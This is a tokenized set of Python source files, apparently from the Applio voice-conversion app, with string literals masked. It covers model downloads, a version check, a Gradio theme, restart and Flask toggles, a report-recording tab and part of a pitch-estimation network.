<EOL> os . makedirs ( os . path . dirname ( destination_path ) or "<STR_LIT>" , exist_ok = True ) <EOL> print ( f"<STR_LIT>" ) <EOL> wget . download ( url , out = destination_path ) <EOL> if pretraineds_v2 == "<STR_LIT>" : <EOL> for remote_folder , file_list in pretraineds_v2_list : <EOL> local_folder = folder_mapping_list . get ( remote_folder , "<STR_LIT>" ) <EOL> for file in file_list : <EOL> destination_path = os . path . join ( local_folder , file ) <EOL> url = f"<STR_LIT>" <EOL> if not os . path . exists ( destination_path ) : <EOL> os . makedirs ( os . path . dirname ( destination_path ) or "<STR_LIT>" , exist_ok = True ) <EOL> print ( f"<STR_LIT>" ) <EOL> wget . download ( url , out = destination_path ) <EOL> </s>
<s> import os , sys <EOL> import json <EOL> import requests <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> config_file = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> def load_local_version ( ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> return config [ "<STR_LIT>" ] <EOL> def obtain_tag_name ( ) : <EOL> url = "<STR_LIT>" <EOL> try : <EOL> response = requests . get ( url ) <EOL> response . raise_for_status ( ) <EOL> data = response . json ( ) <EOL> tag_name = data [ "<STR_LIT>" ] <EOL> return tag_name <EOL> except requests . exceptions . RequestException as e : <EOL> print ( f"<STR_LIT>" ) <EOL> return None <EOL> def compare_version ( ) : <EOL> local_version = load_local_version ( ) <EOL> online_version = obtain_tag_name ( ) <EOL> elements_online_version = list ( map ( int , online_version . split ( "<STR_LIT>" ) ) ) <EOL> elements_local_version = list ( map ( int , local_version . split ( "<STR_LIT>" ) ) ) <EOL> for online , local in zip ( elements_online_version , elements_local_version ) : <EOL> if local < online : <EOL> return f"<STR_LIT>" <EOL> return f"<STR_LIT>" <EOL> </s>
<s> from __future__ import annotations <EOL> from typing import Iterable <EOL> import gradio as gr <EOL> from gradio . themes . base import Base <EOL> from gradio . themes . utils import colors , fonts , sizes <EOL> import time <EOL> class Applio ( Base ) : <EOL> def __init__ ( <EOL> self , <EOL> * , <EOL> primary_hue : colors . Color | str = colors . green , <EOL> secondary_hue : colors . Color | str = colors . emerald , <EOL> neutral_hue : colors . Color | str = colors . neutral , <EOL> spacing_size : sizes . Size | str = sizes . spacing_md , <EOL> radius_size : sizes . Size | str = sizes . radius_md , <EOL> text_size : sizes . Size | str = sizes . text_lg , <EOL> font : fonts . Font | str | Iterable [ fonts . Font | str ] = ( <EOL> "<STR_LIT>" , <EOL> fonts . GoogleFont ( "<STR_LIT>" ) , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> font_mono : fonts . Font | str | Iterable [ fonts . Font | str ] = ( <EOL> "<STR_LIT>" , <EOL> fonts . GoogleFont ( "<STR_LIT>" ) , <EOL> ) , <EOL> ) : <EOL> super ( ) . __init__ ( <EOL> primary_hue = primary_hue , <EOL> secondary_hue = secondary_hue , <EOL> neutral_hue = neutral_hue , <EOL> spacing_size = spacing_size , <EOL> radius_size = radius_size , <EOL> text_size = text_size , <EOL> font = font , <EOL> font_mono = font_mono , <EOL> ) <EOL> self . name = ( "<STR_LIT>" , ) <EOL> self . secondary_100 = ( "<STR_LIT>" , ) <EOL> self . secondary_200 = ( "<STR_LIT>" , ) <EOL> self . secondary_300 = ( "<STR_LIT>" , ) <EOL> self . secondary_400 = ( "<STR_LIT>" , ) <EOL> self . secondary_50 = ( "<STR_LIT>" , ) <EOL> self . secondary_500 = ( "<STR_LIT>" , ) <EOL> self . secondary_600 = ( "<STR_LIT>" , ) <EOL> self . secondary_700 = ( "<STR_LIT>" , ) <EOL> self . secondary_800 = ( "<STR_LIT>" , ) <EOL> self . secondary_900 = ( "<STR_LIT>" , ) <EOL> self . secondary_950 = ( "<STR_LIT>" , ) <EOL> super ( ) . set ( <EOL> background_fill_primary = "<STR_LIT>" , <EOL> background_fill_primary_dark = "<STR_LIT>" , <EOL> background_fill_secondary = "<STR_LIT>" , <EOL> background_fill_secondary_dark = "<STR_LIT>" , <EOL> block_background_fill = "<STR_LIT>" , <EOL> block_background_fill_dark = "<STR_LIT>" , <EOL> block_border_color = "<STR_LIT>" , <EOL> block_border_color_dark = "<STR_LIT>" , <EOL> block_border_width = "<STR_LIT>" , <EOL> block_border_width_dark = "<STR_LIT>" , <EOL> block_info_text_color = "<STR_LIT>" , <EOL> block_info_text_color_dark = "<STR_LIT>" , <EOL> block_info_text_size = "<STR_LIT>" , <EOL> block_info_text_weight = "<STR_LIT>" , <EOL> block_label_background_fill = "<STR_LIT>" , <EOL> block_label_background_fill_dark = "<STR_LIT>" , <EOL> block_label_border_color = "<STR_LIT>" , <EOL> block_label_border_color_dark = "<STR_LIT>" , <EOL> block_label_border_width = "<STR_LIT>" , <EOL> block_label_border_width_dark = "<STR_LIT>" , <EOL> block_label_margin = "<STR_LIT>" , <EOL> block_label_padding = "<STR_LIT>" , <EOL> block_label_radius = "<STR_LIT>" , <EOL> block_label_right_radius = "<STR_LIT>" , <EOL> block_label_shadow = "<STR_LIT>" , <EOL> block_label_text_color = "<STR_LIT>" , <EOL> block_label_text_color_dark = "<STR_LIT>" , <EOL> block_label_text_weight = "<STR_LIT>" , <EOL> block_padding = "<STR_LIT>" , <EOL> block_radius = "<STR_LIT>" , <EOL> block_shadow = "<STR_LIT>" , <EOL> block_shadow_dark = "<STR_LIT>" , <EOL> block_title_background_fill = "<STR_LIT>" , <EOL> block_title_background_fill_dark = "<STR_LIT>" , <EOL> block_title_border_color = "<STR_LIT>" , <EOL> block_title_border_color_dark = "<STR_LIT>" , <EOL> block_title_border_width = "<STR_LIT>" , <EOL> block_title_padding = "<STR_LIT>" , <EOL> block_title_radius = "<STR_LIT>" , <EOL> block_title_text_color = "<STR_LIT>" , <EOL> block_title_text_color_dark = "<STR_LIT>" , <EOL> block_title_text_size = "<STR_LIT>" , <EOL> block_title_text_weight = "<STR_LIT>" , <EOL> body_background_fill = "<STR_LIT>" , <EOL> body_background_fill_dark = "<STR_LIT>" , <EOL> body_text_color = "<STR_LIT>" , <EOL> body_text_color_dark = "<STR_LIT>" , <EOL> body_text_color_subdued = "<STR_LIT>" , <EOL> body_text_color_subdued_dark = "<STR_LIT>" , <EOL> body_text_size = "<STR_LIT>" , <EOL> body_text_weight = "<STR_LIT>" , <EOL> border_color_accent = "<STR_LIT>" , <EOL> border_color_accent_dark = "<STR_LIT>" , <EOL> border_color_primary = "<STR_LIT>" , <EOL> border_color_primary_dark = "<STR_LIT>" , <EOL> button_border_width = "<STR_LIT>" , <EOL> button_border_width_dark = "<STR_LIT>" , <EOL> button_cancel_background_fill = "<STR_LIT>" , <EOL> button_cancel_background_fill_dark = "<STR_LIT>" , <EOL> button_cancel_background_fill_hover = "<STR_LIT>" , <EOL> button_cancel_background_fill_hover_dark = "<STR_LIT>" , <EOL> button_cancel_border_color = "<STR_LIT>" , <EOL> button_cancel_border_color_dark = "<STR_LIT>" , <EOL> button_cancel_border_color_hover = "<STR_LIT>" , <EOL> button_cancel_border_color_hover_dark = "<STR_LIT>" , <EOL> button_cancel_text_color = "<STR_LIT>" , <EOL> button_cancel_text_color_dark = "<STR_LIT>" , <EOL> button_cancel_text_color_hover = "<STR_LIT>" , <EOL> button_cancel_text_color_hover_dark = "<STR_LIT>" , <EOL> button_large_padding = "<STR_LIT>" , <EOL> button_large_radius = "<STR_LIT>" , <EOL> button_large_text_size = "<STR_LIT>" , <EOL> button_large_text_weight = "<STR_LIT>" , <EOL> button_primary_background_fill = "<STR_LIT>" , <EOL> button_primary_background_fill_dark = "<STR_LIT>" , <EOL> button_primary_background_fill_hover = "<STR_LIT>" , <EOL> button_primary_background_fill_hover_dark = "<STR_LIT>" , <EOL> button_primary_border_color = "<STR_LIT>" , <EOL> button_primary_border_color_dark = "<STR_LIT>" , <EOL> button_primary_border_color_hover = "<STR_LIT>" , <EOL> button_primary_border_color_hover_dark = "<STR_LIT>" , <EOL> button_primary_text_color = "<STR_LIT>" , <EOL> button_primary_text_color_dark = "<STR_LIT>" , <EOL> button_primary_text_color_hover = "<STR_LIT>" , <EOL> button_primary_text_color_hover_dark = "<STR_LIT>" , <EOL> button_secondary_background_fill = "<STR_LIT>" , <EOL> button_secondary_background_fill_dark = "<STR_LIT>" , <EOL> button_secondary_background_fill_hover = "<STR_LIT>" , <EOL> button_secondary_background_fill_hover_dark = "<STR_LIT>" , <EOL> button_secondary_border_color = "<STR_LIT>" , <EOL> button_secondary_border_color_dark = "<STR_LIT>" , <EOL> button_secondary_border_color_hover = "<STR_LIT>" , <EOL> button_secondary_border_color_hover_dark = "<STR_LIT>" , <EOL> button_secondary_text_color = "<STR_LIT>" , <EOL> button_secondary_text_color_dark = "<STR_LIT>" , <EOL> button_secondary_text_color_hover = "<STR_LIT>" , <EOL> button_secondary_text_color_hover_dark = "<STR_LIT>" , <EOL> button_shadow = "<STR_LIT>" , <EOL> button_shadow_active = "<STR_LIT>" , <EOL> button_shadow_hover = "<STR_LIT>" , <EOL> button_small_padding = "<STR_LIT>" , <EOL> button_small_radius = "<STR_LIT>" , <EOL> button_small_text_size = "<STR_LIT>" , <EOL> button_small_text_weight = "<STR_LIT>" , <EOL> button_transition = "<STR_LIT>" , <EOL> checkbox_background_color = "<STR_LIT>" , <EOL> checkbox_background_color_dark = "<STR_LIT>" , <EOL> checkbox_background_color_focus = "<STR_LIT>" , <EOL> checkbox_background_color_focus_dark = "<STR_LIT>" , <EOL> checkbox_background_color_hover = "<STR_LIT>" , <EOL> checkbox_background_color_hover_dark = "<STR_LIT>" , <EOL> checkbox_background_color_selected = "<STR_LIT>" , <EOL> checkbox_background_color_selected_dark = "<STR_LIT>" , <EOL> checkbox_border_color = "<STR_LIT>" , <EOL> checkbox_border_color_dark = "<STR_LIT>" , <EOL> checkbox_border_color_focus = "<STR_LIT>" , <EOL> checkbox_border_color_focus_dark = "<STR_LIT>" , <EOL> checkbox_border_color_hover = "<STR_LIT>" , <EOL> checkbox_border_color_hover_dark = "<STR_LIT>" , <EOL> checkbox_border_color_selected = "<STR_LIT>" , <EOL> checkbox_border_color_selected_dark = "<STR_LIT>" , <EOL> checkbox_border_radius = "<STR_LIT>" , <EOL> checkbox_border_width = "<STR_LIT>" , <EOL> checkbox_border_width_dark = "<STR_LIT>" , <EOL> checkbox_check = "<STR_LIT>" , <EOL> checkbox_label_background_fill = "<STR_LIT>" , <EOL> checkbox_label_background_fill_dark = "<STR_LIT>" , <EOL> checkbox_label_background_fill_hover = "<STR_LIT>" , <EOL> checkbox_label_background_fill_hover_dark = "<STR_LIT>" , <EOL> checkbox_label_background_fill_selected = "<STR_LIT>" , <EOL> checkbox_label_background_fill_selected_dark = "<STR_LIT>" , <EOL> checkbox_label_border_color = "<STR_LIT>" , <EOL> checkbox_label_border_color_dark = "<STR_LIT>" , <EOL> checkbox_label_border_color_hover = "<STR_LIT>" , <EOL> checkbox_label_border_color_hover_dark = "<STR_LIT>" , <EOL> checkbox_label_border_width = "<STR_LIT>" , <EOL> checkbox_label_border_width_dark = "<STR_LIT>" , <EOL> checkbox_label_gap = "<STR_LIT>" , <EOL> checkbox_label_padding = "<STR_LIT>" , <EOL> checkbox_label_shadow = "<STR_LIT>" , <EOL> checkbox_label_text_color = "<STR_LIT>" , <EOL> checkbox_label_text_color_dark = "<STR_LIT>" , <EOL> checkbox_label_text_color_selected = "<STR_LIT>" , <EOL> checkbox_label_text_color_selected_dark = "<STR_LIT>" , <EOL> checkbox_label_text_size = "<STR_LIT>" , <EOL> checkbox_label_text_weight = "<STR_LIT>" , <EOL> checkbox_shadow = "<STR_LIT>" , <EOL> color_accent = "<STR_LIT>" , <EOL> color_accent_soft = "<STR_LIT>" , <EOL> color_accent_soft_dark = "<STR_LIT>" , <EOL> container_radius = "<STR_LIT>" , <EOL> embed_radius = "<STR_LIT>" , <EOL> error_background_fill = "<STR_LIT>" , <EOL> error_background_fill_dark = "<STR_LIT>" , <EOL> error_border_color = "<STR_LIT>" , <EOL> error_border_color_dark = "<STR_LIT>" , <EOL> error_border_width = "<STR_LIT>" , <EOL> error_border_width_dark = "<STR_LIT>" , <EOL> error_text_color = "<STR_LIT>" , <EOL> error_text_color_dark = "<STR_LIT>" , <EOL> form_gap_width = "<STR_LIT>" , <EOL> input_background_fill = "<STR_LIT>" , <EOL> input_background_fill_dark = "<STR_LIT>" , <EOL> input_background_fill_focus = "<STR_LIT>" , <EOL> input_background_fill_focus_dark = "<STR_LIT>" , <EOL> input_background_fill_hover = "<STR_LIT>" , <EOL> input_background_fill_hover_dark = "<STR_LIT>" , <EOL> input_border_color = "<STR_LIT>" , <EOL> input_border_color_dark = "<STR_LIT>" , <EOL> input_border_color_focus = "<STR_LIT>" , <EOL> input_border_color_focus_dark = "<STR_LIT>" , <EOL> input_border_color_hover = "<STR_LIT>" , <EOL> input_border_color_hover_dark = "<STR_LIT>" , <EOL> input_border_width = "<STR_LIT>" , <EOL> input_border_width_dark = "<STR_LIT>" , <EOL> input_padding = "<STR_LIT>" , <EOL> input_placeholder_color = "<STR_LIT>" , <EOL> input_placeholder_color_dark = "<STR_LIT>" , <EOL> input_radius = "<STR_LIT>" , <EOL> input_shadow = "<STR_LIT>" , <EOL> input_shadow_dark = "<STR_LIT>" , <EOL> input_shadow_focus = "<STR_LIT>" , <EOL> input_shadow_focus_dark = "<STR_LIT>" , <EOL> input_text_size = "<STR_LIT>" , <EOL> input_text_weight = "<STR_LIT>" , <EOL> layout_gap = "<STR_LIT>" , <EOL> link_text_color = "<STR_LIT>" , <EOL> link_text_color_active = "<STR_LIT>" , <EOL> link_text_color_active_dark = "<STR_LIT>" , <EOL> link_text_color_dark = "<STR_LIT>" , <EOL> link_text_color_hover = "<STR_LIT>" , <EOL> link_text_color_hover_dark = "<STR_LIT>" , <EOL> link_text_color_visited = "<STR_LIT>" , <EOL> link_text_color_visited_dark = "<STR_LIT>" , <EOL> loader_color = "<STR_LIT>" , <EOL> loader_color_dark = "<STR_LIT>" , <EOL> panel_background_fill = "<STR_LIT>" , <EOL> panel_background_fill_dark = "<STR_LIT>" , <EOL> panel_border_color = "<STR_LIT>" , <EOL> panel_border_color_dark = "<STR_LIT>" , <EOL> panel_border_width = "<STR_LIT>" , <EOL> panel_border_width_dark = "<STR_LIT>" , <EOL> prose_header_text_weight = "<STR_LIT>" , <EOL> prose_text_size = "<STR_LIT>" , <EOL> prose_text_weight = "<STR_LIT>" , <EOL> radio_circle = "<STR_LIT>" , <EOL> section_header_text_size = "<STR_LIT>" , <EOL> section_header_text_weight = "<STR_LIT>" , <EOL> shadow_drop = "<STR_LIT>" , <EOL> shadow_drop_lg = "<STR_LIT>" , <EOL> shadow_inset = "<STR_LIT>" , <EOL> shadow_spread = "<STR_LIT>" , <EOL> shadow_spread_dark = "<STR_LIT>" , <EOL> slider_color = "<STR_LIT>" , <EOL> slider_color_dark = "<STR_LIT>" , <EOL> stat_background_fill = "<STR_LIT>" , <EOL> stat_background_fill_dark = "<STR_LIT>" , <EOL> table_border_color = "<STR_LIT>" , <EOL> table_border_color_dark = "<STR_LIT>" , <EOL> table_even_background_fill = "<STR_LIT>" , <EOL> table_even_background_fill_dark = "<STR_LIT>" , <EOL> table_odd_background_fill = "<STR_LIT>" , <EOL> table_odd_background_fill_dark = "<STR_LIT>" , <EOL> table_radius = "<STR_LIT>" , <EOL> table_row_focus = "<STR_LIT>" , <EOL> table_row_focus_dark = "<STR_LIT>" , <EOL> ) <EOL> </s>
<s> def pretrained_selector ( pitch_guidance ) : <EOL> if pitch_guidance : <EOL> return { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> } , <EOL> } <EOL> else : <EOL> return { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> } , <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> "<STR_LIT>" : ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> ) , <EOL> } , <EOL> } <EOL> </s>
<s> import gradio as gr <EOL> import os <EOL> import sys <EOL> now_dir = os . getcwd ( ) <EOL> pid_file_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> def restart_applio ( ) : <EOL> if os . name != "<STR_LIT>" : <EOL> os . system ( "<STR_LIT>" ) <EOL> else : <EOL> os . system ( "<STR_LIT>" ) <EOL> try : <EOL> with open ( pid_file_path , "<STR_LIT>" ) as pid_file : <EOL> pids = [ int ( pid ) for pid in pid_file . readlines ( ) ] <EOL> for pid in pids : <EOL> os . kill ( pid , <NUM_LIT> ) <EOL> os . remove ( pid_file_path ) <EOL> except : <EOL> pass <EOL> python = sys . executable <EOL> os . execl ( python , python , * sys . argv ) <EOL> from assets . i18n . i18n import I18nAuto <EOL> i18n = I18nAuto ( ) <EOL> def restart_tab ( ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> restart_button = gr . Button ( i18n ( "<STR_LIT>" ) ) <EOL> restart_button . click ( <EOL> fn = restart_applio , <EOL> inputs = [ ] , <EOL> outputs = [ ] , <EOL> ) <EOL> </s>
<s> import os <EOL> import sys <EOL> import gradio as gr <EOL> from assets . i18n . i18n import I18nAuto <EOL> import requests <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> from assets . flask . server import start_flask , load_config_flask , save_config <EOL> i18n = I18nAuto ( ) <EOL> def flask_server_tab ( ) : <EOL> with gr . Row ( ) : <EOL> with gr . Column ( ) : <EOL> flask_checkbox = gr . Checkbox ( <EOL> label = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> interactive = True , <EOL> value = load_config_flask ( ) , <EOL> ) <EOL> flask_checkbox . change ( <EOL> fn = toggle , <EOL> inputs = [ flask_checkbox ] , <EOL> outputs = [ ] , <EOL> ) <EOL> def toggle ( checkbox ) : <EOL> save_config ( bool ( checkbox ) ) <EOL> if load_config_flask ( ) == True : <EOL> start_flask ( ) <EOL> else : <EOL> try : <EOL> requests . post ( "<STR_LIT>" ) <EOL> except requests . exceptions . ConnectionError : <EOL> pass <EOL> </s>
<s> import gradio as gr <EOL> import sys <EOL> import os <EOL> import logging <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> from tabs . inference . inference import inference_tab <EOL> from tabs . train . train import train_tab <EOL> from tabs . extra . extra import extra_tab <EOL> from tabs . report . report import report_tab <EOL> from tabs . download . download import download_tab <EOL> from tabs . tts . tts import tts_tab <EOL> from tabs . voice_blender . voice_blender import voice_blender_tab <EOL> from tabs . settings . presence import presence_tab , load_config_presence <EOL> from tabs . settings . flask_server import flask_server_tab <EOL> from tabs . settings . fake_gpu import fake_gpu_tab , gpu_available , load_fake_gpu <EOL> from tabs . settings . themes import theme_tab <EOL> from tabs . plugins . plugins import plugins_tab <EOL> from tabs . settings . version import version_tab <EOL> from tabs . settings . lang import lang_tab <EOL> from tabs . settings . restart import restart_tab <EOL> import assets . themes . loadThemes as loadThemes <EOL> from assets . i18n . i18n import I18nAuto <EOL> import assets . installation_checker as installation_checker <EOL> from assets . discord_presence import RPCManager <EOL> from assets . flask . server import start_flask , load_config_flask <EOL> from core import run_prerequisites_script <EOL> run_prerequisites_script ( "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> i18n = I18nAuto ( ) <EOL> if load_config_presence ( ) == True : <EOL> RPCManager . start_presence ( ) <EOL> installation_checker . check_installation ( ) <EOL> logging . getLogger ( "<STR_LIT>" ) . disabled = True <EOL> logging . getLogger ( "<STR_LIT>" ) . disabled = True <EOL> if load_config_flask ( ) == True : <EOL> print ( "<STR_LIT>" ) <EOL> start_flask ( ) <EOL> my_applio = loadThemes . load_json ( ) <EOL> if my_applio : <EOL> pass <EOL> else : <EOL> my_applio = "<STR_LIT>" <EOL> with gr . Blocks ( theme = my_applio , title = "<STR_LIT>" ) as Applio : <EOL> gr . Markdown ( "<STR_LIT>" ) <EOL> gr . Markdown ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> gr . Markdown ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> inference_tab ( ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> if gpu_available ( ) or load_fake_gpu ( ) : <EOL> train_tab ( ) <EOL> else : <EOL> gr . Markdown ( <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) <EOL> ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> tts_tab ( ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> voice_blender_tab ( ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> plugins_tab ( ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> download_tab ( ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> report_tab ( ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> extra_tab ( ) <EOL> with gr . Tab ( i18n ( "<STR_LIT>" ) ) : <EOL> presence_tab ( ) <EOL> flask_server_tab ( ) <EOL> if not gpu_available ( ) : <EOL> fake_gpu_tab ( ) <EOL> theme_tab ( ) <EOL> version_tab ( ) <EOL> lang_tab ( ) <EOL> restart_tab ( ) <EOL> if __name__ == "<STR_LIT>" : <EOL> port = <NUM_LIT> <EOL> if "<STR_LIT>" in sys . argv : <EOL> port_index = sys . argv . index ( "<STR_LIT>" ) + <NUM_LIT> <EOL> if port_index < len ( sys . argv ) : <EOL> port = int ( sys . argv [ port_index ] ) <EOL> Applio . launch ( <EOL> favicon_path = "<STR_LIT>" , <EOL> share = "<STR_LIT>" in sys . argv , <EOL> inbrowser = "<STR_LIT>" in sys . argv , <EOL> server_port = port , <EOL> ) <EOL> </s>
<s> import os <EOL> import sys <EOL> import base64 <EOL> import pathlib <EOL> import tempfile <EOL> import gradio as gr <EOL> from assets . i18n . i18n import I18nAuto <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> i18n = I18nAuto ( ) <EOL> recorder_js_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> main_js_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> record_button_js_path = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ) <EOL> recorder_js = pathlib . Path ( recorder_js_path ) . read_text ( ) <EOL> main_js = pathlib . Path ( main_js_path ) . read_text ( ) <EOL> record_button_js = ( <EOL> pathlib . Path ( record_button_js_path ) <EOL> . read_text ( ) <EOL> . replace ( "<STR_LIT>" , recorder_js ) <EOL> . replace ( "<STR_LIT>" , main_js ) <EOL> ) <EOL> def save_base64_video ( base64_string ) : <EOL> base64_video = base64_string <EOL> video_data = base64 . b64decode ( base64_video ) <EOL> with tempfile . NamedTemporaryFile ( suffix = "<STR_LIT>" , delete = False ) as temp_file : <EOL> temp_filename = temp_file . name <EOL> temp_file . write ( video_data ) <EOL> print ( f"<STR_LIT>" ) <EOL> return temp_filename <EOL> def report_tab ( ) : <EOL> instructions = [ <EOL> i18n ( "<STR_LIT>" ) , <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> ] <EOL> components = [ gr . Markdown ( value = instruction ) for instruction in instructions ] <EOL> start_button = gr . Button ( "<STR_LIT>" ) <EOL> video_component = gr . Video ( interactive = False ) <EOL> def toggle_button_label ( returned_string ) : <EOL> if returned_string . startswith ( "<STR_LIT>" ) : <EOL> return gr . Button ( value = "<STR_LIT>" ) , None <EOL> else : <EOL> try : <EOL> temp_filename = save_base64_video ( returned_string ) <EOL> except Exception as error : <EOL> return gr . Button ( value = "<STR_LIT>" ) , gr . Warning ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> return gr . Button ( value = "<STR_LIT>" ) , gr . Video ( <EOL> value = temp_filename , interactive = False <EOL> ) <EOL> start_button . click ( <EOL> toggle_button_label , <EOL> start_button , <EOL> [ start_button , video_component ] , <EOL> js = record_button_js , <EOL> ) <EOL> </s>
<s> import torch . nn as nn <EOL> import torch , numpy as np <EOL> import torch . nn . functional as F <EOL> from librosa . filters import mel <EOL> class BiGRU ( nn . Module ) : <EOL> def __init__ ( self , input_features , hidden_features , num_layers ) : <EOL> super ( BiGRU , self ) . __init__ ( ) <EOL> self . gru = nn . GRU ( <EOL> input_features , <EOL> hidden_features , <EOL> num_layers = num_layers , <EOL> batch_first = True , <EOL> bidirectional = True , <EOL> ) <EOL> def forward ( self , x ) : <EOL> return self . gru ( x ) [ <NUM_LIT> ] <EOL> class ConvBlockRes ( nn . Module ) : <EOL> def __init__ ( self , in_channels , out_channels , momentum = <NUM_LIT> ) : <EOL> super ( ConvBlockRes , self ) . __init__ ( ) <EOL> self . conv = nn . Sequential ( <EOL> nn . Conv2d ( <EOL> in_channels = in_channels , <EOL> out_channels = out_channels , <EOL> kernel_size = ( <NUM_LIT> , <NUM_LIT> ) , <EOL> stride = ( <NUM_LIT> , <NUM_LIT> ) , <EOL> padding = ( <NUM_LIT> , <NUM_LIT> ) , <EOL> bias = False , <EOL> ) , <EOL> nn . BatchNorm2d ( out_channels , momentum = momentum ) , <EOL> nn . ReLU ( ) , <EOL> nn . Conv2d ( <EOL> in_channels = out_channels , <EOL> out_channels = out_channels , <EOL> kernel_size = ( <NUM_LIT> , <NUM_LIT> ) , <EOL> stride = ( <NUM_LIT> , <NUM_LIT> ) , <EOL> padding = ( <NUM_LIT> , <NUM_LIT> ) , <EOL> bias = False , <EOL> ) , <EOL> nn . BatchNorm2d ( out_channels , momentum = momentum ) , <EOL> nn . ReLU ( ) , <EOL> ) <EOL> if in_channels != out_channels : <EOL> self . shortcut = nn . Conv2d ( in_channels , out_channels , ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> self . is_shortcut = True <EOL> else : <EOL> self . is_shortcut = False <EOL> def forward ( self , x ) : <EOL> if self . is_shortcut : <EOL> return self . conv ( x ) + self . shortcut ( x ) <EOL> else : <EOL> return self . conv ( x ) + x <EOL> class Encoder ( nn . Module ) : <EOL> def __init__ ( <EOL> self , <EOL> in_channels , <EOL> in_size , <EOL> n_encoders , <EOL> kernel_size , <EOL> n_blocks , <EOL> out_channels = <NUM_LIT> , <EOL> momentum = <NUM_LIT> , <EOL> ) : <EOL> super ( Encoder , self ) . __init__ ( ) <EOL> self . n_encoders = n_encoders <EOL> self . bn = nn . BatchNorm2d ( in_channels , momentum = momentum ) <EOL> self . layers = nn . ModuleList ( ) <EOL> self . latent_channels = [ ] <EOL> for i in range ( self . n_encoders ) : <EOL> self . layers . append ( <EOL> ResEncoderBlock ( <EOL> in_channels , out_channels , kernel_size , n_blocks , momentum = momentum <EOL> ) <EOL> ) <EOL> self . latent_channels . append ( [ out_channels , in_size ] ) <EOL> in_channels = out_channels <EOL> out_channels *= <NUM_LIT> <EOL> in_size //= <NUM_LIT> <EOL> self . out_size = in_size <EOL> self . out_channel = out_channels <EOL> def forward ( self , x ) : <EOL> concat_tensors = [ ] <EOL> x = self . bn ( x ) <EOL> for i in range ( self . n_encoders ) : <EOL> _ , x = self . layers [ i ] ( x ) <EOL> concat_tensors . append ( _ ) <EOL> return x , concat_tensors <EOL> class ResEncoderBlock ( nn . Module ) : <EOL> def __init__ ( <EOL> self , in_channels , out_channels , kernel_size , n_blocks = <NUM_LIT> , momentum = <NUM_LIT> <EOL> ) : <EOL> super ( ResEncoderBlock , self ) . __init__ ( ) <EOL> self . n_blocks = n_blocks <EOL> self . conv = nn . ModuleList ( ) <EOL> self . conv . append ( ConvBlockRes ( in_channels , out_channels , momentum ) ) <EOL> for i in range ( n_blocks - <NUM_LIT> ) : <EOL> self . conv . append ( ConvBlockRes ( out_channels , out_channels , momentum ) ) <EOL> self . kernel_size = kernel_size <EOL> if self . kernel_size is not None : <EOL> self . pool = nn . AvgPool2d ( kernel_size = kernel_size ) <EOL> def forward ( self , x ) : 